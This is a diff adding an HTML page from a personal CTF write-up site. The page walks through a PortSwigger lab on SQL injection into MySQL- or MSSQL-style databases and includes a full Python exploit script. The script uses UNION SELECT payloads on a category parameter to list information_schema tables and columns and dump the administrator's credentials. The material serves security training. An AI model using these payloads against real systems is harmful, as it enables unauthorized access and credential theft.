@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  
+    <!-- Canonical & SEO -->
+    <title>SQL Injection – Listing Database Contents (Non-Oracle) | Shubham Ranpise</title>
+    <meta name="description" content="Learn how to exploit SQL injection vulnerabilities to enumerate and list database contents on non-Oracle systems like MySQL and MSSQL." />
+    <link rel="canonical" href="https://shubhamranpise.com/ctf/portswigger/sqli/sqli5.html" />
+  
+    <!-- Open Graph -->
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="SQLi – List Database Contents | Shubham Ranpise" />
+    <meta property="og:description" content="Walkthrough on using SQL injection to extract tables and data from non-Oracle databases through exploitation." />
+    <meta property="og:url" content="https://shubhamranpise.com/ctf/portswigger/sqli5.html" />
+    <meta property="og:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
+  
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="SQLi Enumeration of Non-Oracle Databases | Shubham Ranpise" />
+    <meta name="twitter:description" content="Using SQL injection to list database contents in MySQL and MSSQL environments." />
+    <meta name="twitter:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
+  
+    <!-- Favicon -->
+    <link rel="icon" href="https://shubhamranpise.com/assets/favicon.png" type="image/png" />
+  
+    <!-- Preloads -->
+    <link rel="preload" href="./../../../assets/home_light.png" as="image" />
+    <link rel="preload" href="./../../../assets/theme_light.png" as="image" />
+    <link rel="preload" href="./../../../assets/profile-pic.png" as="image" />
+  
+    <!-- Theme & Fonts -->
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
+    <link rel="stylesheet" href="./../../../static/css/style.css" />
+    <link rel="stylesheet" href="./../../../static/css/mediaqueries.css" />
+  
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-45Z0Y6HPDS"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'G-45Z0Y6HPDS');
+    </script>
+  
+    <!-- JSON-LD Schema -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "TechArticle",
+      "name": "SQL Injection – Listing Non-Oracle Database Contents",
+      "author": {
+        "@type": "Person",
+        "name": "Shubham Ranpise"
+      },
+      "datePublished": "2025-04-28",
+      "description": "This lab explains how SQL injection is used to list database tables and content in non-Oracle environments like MySQL and MSSQL.",
+      "url": "https://shubhamranpise.com/ctf/portswigger/sqli/sqli5.html"
+    }
+    </script>
+</head>
+  
+<body>
+    <header>
+        <nav id="desktop-nav">
+            <div class="logo">
+                <a href="./../../../index.html" class="logo-wrapper">
+                    <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                        src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                    <span>Shubham</span>
+                </a>
+            </div>
+
+            <div>
+                <ul class="nav-links">
+                    <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                    <li><a href="./../../../notes/notes.html">Notes</a></li>
+                    <li><a href="./../../../about/about.html">About</a></li>
+                    <li>
+                        <img id="modeToggle" class="icon color-icon" src="./../../../assets/theme_light.png"
+                            src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                            alt="Color theme icon" />
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <nav id="hamburger-nav">
+        <div class="logo">
+            <a href="./../../../index.html" class="logo-wrapper">
+                <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                    src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                <span>Shubham</span>
+            </a>
+        </div>
+        <div class="hamburger-menu">
+            <div class="hamburger-icon" onclick="toggleMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="menu-links">
+                <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                <li><a href="./../../../notes/notes.html">Notes</a></li>
+                <li><a href="./../../../about/about.html">About</a></li>
+                <li>
+                    <img id="modeToggle2" class="icon color-icon" src="./../../../assets/theme_light.png"
+                        src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                        alt="Color theme icon" />
+                </li>
+            </div>
+        </div>
+    </nav>
+
+    <div class="breadcrumb-wrapper">
+        <p class="breadcrumb-text">/
+            <a href="./../../../index.html">Home</a>/
+            <a href="./../../ctf.html">Ctf</a>/
+            <a href="./../portswigger.html">Portswigger</a>/
+            <span>SQLi 5</span>
+        </p>
+    </div>
+    <br>
+
+    <section id="ctf">
+        <h2 class="lab-heading">SQL injection attack, listing the database contents on non-Oracle databases</h2>
+        <div class="lab-section">
+            <h3 class="lab-date">🕗 28-April-2025</h3>
+            <h3 class="lab-subheading">📚 What I Learned</h3>
+            <p>This lab taught me how SQL injection can be used not just for authentication bypass but for full database
+                enumeration. By targeting the <b><i>information_schema</i></b> tables on a non-Oracle database (like MySQL or
+                Microsoft SQL Server), I was able to list all tables, find sensitive columns like usernames and
+                passwords, and ultimately extract administrator credentials. It showed how dangerous metadata access
+                through SQLi can be.</p>
+
+            <h3 class="lab-subheading">⚙️ How Exploit Works</h3>
+            <p>
+                [+] Start Burp Suite before running the script — it uses a proxy for visibility.<br>
+                [+] The category parameter is injectable.<br>
+                [+] A <b><i>UNION SELECT</i></b> is used to enumerate table names from <b><i>information_schema</i></b>.tables.<br>
+                [+] Another injection extracts column names for usernames and passwords.<br>
+                [+] A final injection dumps user credentials from the discovered users table.<br>
+                [+] The script automates each step and extracts admin credentials directly.
+            </p>
+
+            <h3 class="lab-subheading">🖥️ Command to Run</h3>
+            <div class="code-block-wrapper">
+                <pre><code>python3 exploit.py https://&lt;your-lab-id&gt;.web-security-academy.net
+</code></pre>
+                <div class="floating-code-buttons">
+                    <button class="copy-btn">📋</button>
+                    <button class="download-btn">⬇️</button>
+                </div>
+
+            </div>
+
+            <br>
+            <div class="code-block-wrapper">
+                <pre><code>import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def Get_User_Table(url):
+    uri = '/filter?category='
+    payload = '\' UNION+SELECT table_name, NULL FROM information_schema.tables--'
+    r = requests.get(url + uri + payload , verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    for th in soup.find_all('th'):
+        if th.text.startswith('users_'):
+            user_value = th.text
+            break
+    
+    return user_value
+
+
+def Get_columns(url, Table_Name):
+    uri = '/filter?category='
+    payload = f"'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='{Table_Name}'--"
+    r = requests.get(url + uri + payload , verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    for th in soup.find_all('th'):
+        if th.text.startswith('username_'):
+            user_value = th.text
+            break
+
+    for th in soup.find_all('th'):
+        if th.text.startswith('password_'):
+            password_value = th.text
+            break
+    
+    return user_value, password_value
+
+
+def Get_Administrator_Credentials(url, Get_User_Table, table_name):
+    user, pwd = Get_User_Table
+    payload = f"' UNION SELECT {user}, {pwd} FROM {table_name}--"
+    uri = '/filter?category='
+    r = requests.get(url + uri + payload , verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    
+    
+    # Find the row where &lt;th&gt; contains "administrator"
+    admin_row = soup.find('th', string='administrator')
+
+    if admin_row:
+        admin_username = admin_row.text.strip()
+        admin_password = admin_row.find_next_sibling('td').text.strip()
+        print("Username:", admin_username)
+        print("Password:", admin_password)
+    else:
+        print("Administrator entry not found.")
+
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+    except IndexError:
+        print("[-] Usage: %s &lt;url&gt;" %sys.argv[0])
+        print('[-] Example: %s www.example.com ' % sys.argv[0])
+        sys.exit(-1)    
+    
+    Get_Administrator_Credentials(url, Get_columns(url, Get_User_Table(url)), Get_User_Table(url))                    
+</code></pre>
+                <div class="floating-code-buttons">
+                    <button class="copy-btn">📋</button>
+                    <button class="download-btn">⬇️</button>
+                </div>
+
+            </div>
+    </section>
+
+    <footer>
+        <p>Copyright &#169; 2025 Shubham Ranpise.</p>
+    </footer>
+
+    <script src="./../../../static/js/main.js"></script>
+</body>
+
+</html>
